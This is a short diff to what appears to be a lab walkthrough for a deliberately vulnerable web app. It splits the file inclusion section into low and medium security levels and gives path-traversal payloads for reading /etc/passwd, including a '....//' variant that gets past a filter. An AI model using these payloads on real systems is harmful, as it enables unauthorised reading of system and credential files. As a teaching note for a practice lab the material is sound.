@@ -48,6 +48,10 @@
 
 # File Inclusion:
 
-<h3>low/medium security level</h3>
+<h3>low security level</h3>
 
-- To run a local file inclusion `/etc/passwd` and see the content of it: `/../../../../../etc/passwd`
+- To run a local file inclusion `/etc/passwd` and see the content of it: `../../../../../../etc/passwd`
+
+<h3>medium security level</h3>
+
+- To run a local file inclusion `/etc/passwd` and see the content of it: `....//....//....//....//....//....//etc/passwd`
